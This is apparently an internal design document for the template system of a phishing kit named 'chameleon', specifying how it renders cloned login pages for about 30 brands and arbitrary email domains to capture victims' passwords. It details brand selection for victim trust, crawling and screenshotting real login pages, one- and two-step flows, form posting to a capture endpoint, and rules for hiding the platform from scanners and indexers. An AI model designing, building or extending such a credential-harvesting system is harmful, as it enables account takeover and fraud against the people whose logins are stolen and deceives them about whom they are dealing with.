# Templates

Templates are in-house and static. One skeleton, parameterised per brand. No
iframes: `X-Frame-Options` and `frame-ancestors` kill live embedding, so every
render is our own HTML with the brand's assets pinned locally.

## Skeleton

One skeleton, three partial sets:

- `one-step` — heading, email field, password field, submit.
- `two-step/step-1` — heading, email field, continue.
- `two-step/step-2` — heading, password field (address shown as a frozen value),
  submit.

Slots, all CSS custom properties or text nodes, all server-substituted:

| Slot                                                          | Source                          | Notes                     |
| ------------------------------------------------------------- | ------------------------------- | ------------------------- |
| `--bg`, `--surface`, `--fg`, `--accent`, `--radius`, `--font` | brand/template or profile       | contrast-corrected        |
| logo                                                          | R2, pinned at template creation | max 320×96, WebP          |
| favicon                                                       | R2, pinned                      | served as the page icon   |
| heading                                                       | brand/template or profile       | e.g. "Sign in"            |
| email label, password label, button label                     | brand/template or profile       | copied from the real page |
| backdrop                                                      | R2, blurred + dimmed WebP       | fixed, behind a card      |

The skeleton is isomorphic string templating (no DOM, no runtime) so the same
code renders in the Worker and in the dashboard preview. It is a pure function
of a `ResolvedTemplate`; it touches no bindings.

### Two-step mode

Two-step is a UI shape, not authentication. `chameleon` has no OTP: the victim
gets no code from the provider, so an OTP box would be a lie. Step two shows the
password only, submits, captures, and 302s. If a brand's real flow is
email → password → code, the final code step is simply absent.

Because most identity providers are split-screen, the skeleton needs a genuine
two-step mode and `profiles.step_count` drives it. Degradation rule: if the crawl
reaches a password field only on step two, keep two steps; if the crawl cannot
find a password field at all, or the flow requires a code before the password
(the provider only reveals the password step after verifying a code), degrade to
one step and place both fields on the first screen.

`autocomplete` values are real (`username`, `current-password`) so password
managers and mobile keyboards behave, and so the page feels native.

## Resolution order

NORMATIVE, first match wins, evaluated entirely server-side:

1. Link has `pinned_brand_id` → that brand's template.
2. `email` param present and its domain matches `brand_map.email_domains` →
   that brand's template, address prefilled.
3. `email` domain unmatched → `profiles` row for the domain from KV; if none,
   cPanel template immediately and enqueue profile generation.
4. No `email` and no pin → cPanel.

Case-folds the domain, strips `www.`, and matches on the registrable domain
`OPEN-TPL-01` (public-suffix list vs naive last-two-labels).

`brand_map` also matches known aliases (`googlemail.com` → Gmail,
`protonmail.com` → Proton) per brand, stored as an array.

## Brand map

30 brands at launch, `brands` table: `slug`, `name`, `email_domains[]`,
`template_key`, asset refs, `enabled`. Seeded by migration, curated by us. A
brand is a row plus pinned assets, not a folder of HTML.

Selection criteria: high volume in cold-email verticals, a login page with a
password field, recognisable enough that a victim does not pause. Mix of consumer
SaaS, finance, and identity providers. The identity providers are deliberately
included even though they are two-step, because a Google-looking page is the
highest-yield click in the category.

cPanel is brand zero: default, fallback, and decoy. It is not in the mailed brand
list and never needs a profile.

## Profiles

For domains the map does not cover. Generated on demand, never in the request
path.

Crawl order, stop at first password field:
`/login`, `/signin`, `/account`, `/wp-login.php`, `/wp-admin`, `/administrator`,
then root.

Each hop: fetch with a 5s budget, 1MB cap, follow up to 3 redirects, ignore
robots. From the page that contains a password field, extract: palette (from the
logo + dominant page colours), logo `img`/`svg`, favicon, heading text, field
labels, and step count. Then screenshot 1280×800, downscale, blur 12px, dim to
60% luminance, encode WebP q72, store in R2.

`profiles` row: `email_domain`, `profile jsonb`, `assets r2 prefix`, `status`
(`generated` | `accepted` | `rejected`), `step_count`, `fetched_from`, `expires_at`
(30 days), `fail_reason`.

KV cache: `prof:<sha1(domain)>` → profile + assets, 30-day TTL. On hit, render
straight from KV. On miss, render cPanel and enqueue.

Dashboard shows generated profiles with the screenshot, a preview link, and
accept / edit / reject. Reject writes `status='rejected'` and the domain renders
cPanel for 30 days. Edit writes the tenant's own palette/labels and counts as
accepted. Tenant edits never touch the brand map or other tenants.

`OPEN-TPL-02`: profile generation for a domain seen by another tenant — reuse
across tenants (cheaper, and brands are public) or scope per org (tenant edits
do not collide). Current lean: reuse the generated row, scope the _edit_.

## Assets

Pinned at template creation, never hot-linked. Logos and favicons re-encoded to
WebP/PNG with a max dimension; backdrops to WebP. Served from R2 behind a Worker
route with a long `immutable` cache and no cookies, so the render is
cache-friendly. If a brand's asset fetch fails at seed time, ship a text-only
logo in the brand's accent colour and mark `assets_degraded` — a render must
never block on an asset.

## Rendering rules

- No external requests at render time. No fonts from Google, no CDN, no
  analytics.
- Password field is `type=password`, `name=password`, `autocomplete=current-password`.
- Form posts to `POST /c/<token>` with the token from the resolution step.
- Submit button disabled + label swap after first click; the 302 is fast but a
  double-submit is the commonest duplicate source.
- Self-hosted CSS, inlined, under 6KB total response for the shell.
- `<title>` is the brand's, not ours. `favicon` is the brand's.
- No `<meta name=generator>`, no footer, no comment markers.
- `robots` is `noindex, nofollow`; scanners do not honour it but indexers might.

## What a render must never leak

- Platform hostname, tenant hostname in a canonical tag, or "Powered by".
- A form action pointing anywhere but the same path.
- Any JS that reveals the template mechanism. The only JS is the submit guard.

Last reviewed: 2026-11-20
